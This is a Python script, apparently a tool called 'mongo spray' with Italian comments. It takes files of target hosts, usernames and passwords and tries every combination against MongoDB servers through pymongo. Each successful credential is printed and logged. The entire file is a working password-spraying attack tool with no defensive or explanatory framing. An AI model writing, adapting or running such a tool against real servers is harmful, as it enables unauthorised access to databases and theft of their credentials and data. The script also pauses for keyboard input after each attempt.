import time
import sys
import ZHOR_Modules.fileManager as fm
import ZHOR_Modules.nicePrints as np
import ZHOR_Modules.logUtils as logu

import pymongo
import os
import argparse
import sys

parser = argparse.ArgumentParser(description="mongo spray")
REQUIRED_ARGUMENTS = parser.add_argument_group("Required arguments")
OPTIONAL_ARGUMENTS = parser.add_argument_group("Optional arguments")

# Argomenti necessari
REQUIRED_ARGUMENTS.add_argument('-t',metavar='"TARGET LIST"',type=str,required=True,help='Target IP or fqdn list file')
REQUIRED_ARGUMENTS.add_argument('-u',metavar='"USERS"',type=str,required=True,help='Users list file')
REQUIRED_ARGUMENTS.add_argument('-p',metavar='"PASSWORDS"',type=str,required=True,help='Passwords list file')


# Argomenti opzionali
OPTIONAL_ARGUMENTS.add_argument('--debug',action="store_true",help="Debug mode")

args = parser.parse_args()

np.DEBUG = ('--debug' in sys.argv)

# ========================================================================================================



def performConnection(target: str, username: str, password: str):

    values = target.split(':')
    
    try:
        
        client = pymongo.MongoClient(host=values[0],port=int(values[1]),username=username,password=password)
        client.server_info()

        msg = "Target{} --- User: {} --- Password: {}".format(target,username,password)
        np.infoPrint("Connection succeded: " + msg)

        logu.logInfo(msg)

    except Exception as e:
        np.errorPrint("Connection failed. See exception: below")
        print(e,"\n")
        


if __name__ == '__main__':
    targets = fm.fileToSimpleList(args.t)
    users = fm.fileToSimpleList(args.u)
    passwords = fm.fileToSimpleList(args.p)

    for t in targets:
        for u in users:
            for p in passwords:
                    
                msg = "target {} --- User: {} --- Password: {}".format(t,u,p)
                np.infoPrint("Testing " + msg)
                performConnection(t,u,p)
                time.sleep(0.2) 

                input()